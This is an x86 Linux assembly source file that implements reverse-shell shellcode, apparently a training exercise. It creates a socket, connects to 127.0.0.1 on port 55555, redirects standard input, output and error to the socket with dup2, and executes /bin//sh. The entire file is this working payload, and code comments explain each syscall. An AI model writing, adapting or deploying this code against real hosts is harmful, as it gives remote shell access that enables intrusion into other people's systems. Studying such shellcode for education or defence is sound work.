section .text
    global _start

_start: 

    push 0x66      ;socket call
    pop	 eax
    push 0x1       ; int argument call
    pop	 ebx
                   ;socket(AF_INET, SOCK_STREAM, 0)
    xor  edx, edx  ;pass args for the socket connection function by pushing the args into the stack from the to first
    push edx       ; 0
    push ebx       ; 1
    push 0x2       ; 2
    mov  ecx, esp  ; stack pointer to the arguments it will pop them automatically

    int 0x80       ; will return the socket descriptor in eax and will be used as so in the next functions

    mov edi, eax   ; saves the socket filedescriptor in edi 

                     ; connect(s, (struct sockaddr *)&sa, sizeof(sa))
                     ; first creat the struct sockadrr 
    
    push 0x0101017f  ; ip adress 127.0.0.1
    push word 0x03d9 ; port 55555
    push word 0x2    ; 2 AF_INET syscall
    mov  ecx, esp    ; stack pointer to the arguments it will pop them automatically
    
                    ;now push on the stack the parameters for the CONNECT function
    push 0x10       ; size of the structure
    push ecx        ; the socket structure (ip, port...)
    push edi        ; socket descriptor created in first call
    mov  ecx, esp   ; args in top of the stack 
    
    mov al, 0x66    ; for SYSCALL_SOCKET 0x66
    mov bl, 0x3     ; SYS_CONNECT 0x3
    int 0x80        ; now we call connect()

                    ; I/O Redirection using dup2()

    pop ebx		; moving the file descriptor from the stack
	xor eax, eax	; zeroing out the eax register
	xor ecx, ecx    ; clearing ecx before using the loop
	mov cl, 0x2     ; setting the loop counter (2, 1 then 0)

looper:     
       mov al, 0x3F    ; inserting the hex SYS_DUP2 syscall
       int 0x80        ; syscall
       dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-stdin)
       jns looper

                    ;; call bash witch execve
    

    xor	 ebx, ebx	;give ebx null
    xor  edx, edx 
    push edx		;for null terminator
    push 0x68732f2f	;String "hs//"
    push 0x6e69622f	;String "nib/"  
    
    mov	 ebx, esp
    mov	 ecx, edx	;mov ecx to edx    
    
    mov	 al, 0x0B	;syscall: sys_execve
    int 0x80

    mov eax, 1 
    mov ebx, 1
    int 80h         ; syscall exit(0)





